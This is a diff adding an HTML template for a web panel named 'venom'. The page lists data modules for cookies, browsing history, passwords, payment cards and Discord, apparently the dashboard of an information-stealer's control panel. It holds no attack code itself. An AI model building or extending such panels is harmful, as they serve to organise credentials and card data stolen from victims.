@@ -1,0 +1,56 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    {% include "parts/head.html" %}
+    <title>venom | {{ get("title.data") }}</title>
+    <link href="/css/data.css" rel="stylesheet">
+  </head>
+  <body>
+    {% include "parts/navbar.html" %}
+    <main>
+      {% if error %}
+        {% include "parts/error.html" %}
+      {% endif %}
+      {% if success %}
+        {% include "parts/success.html" %}
+      {% endif %}
+      <div class="modules">
+        <a href="/data/cookie" class="module">
+          <i class='bx bxs-chevrons-right'></i>
+          <div>
+            <i class='bx bxs-cookie'></i> 
+            <h1>{{ get("create.cookie.name") }}</h1>
+          </div>
+        </a>
+        <a href="/data/history" class="module">
+          <i class='bx bxs-chevrons-right'></i>
+          <div>
+            <i class='bx bx-history' ></i> 
+            <h1>{{ get("create.history.name") }}</h1>
+          </div>
+        </a>
+        <a href="/data/password" class="module">
+          <i class='bx bxs-chevrons-right'></i>
+          <div>
+            <i class='bx bxs-key' ></i> 
+            <h1>{{ get("create.password.name") }}</h1>
+          </div>
+        </a>
+        <a href="/data/card" class="module">
+          <i class='bx bxs-chevrons-right'></i>
+          <div>
+            <i class='bx bxs-credit-card-alt' ></i> 
+            <h1>{{ get("create.card.name") }}</h1>
+          </div>
+        </a>
+        <a href="/data/discord" class="module">
+          <i class='bx bxs-chevrons-right'></i>
+          <div>
+            <i class='bx bxl-discord-alt' ></i> 
+            <h1>{{ get("create.discord.name") }}</h1>
+          </div>
+        </a>
+      </div>
+    </main>
+  </body>
+</html>
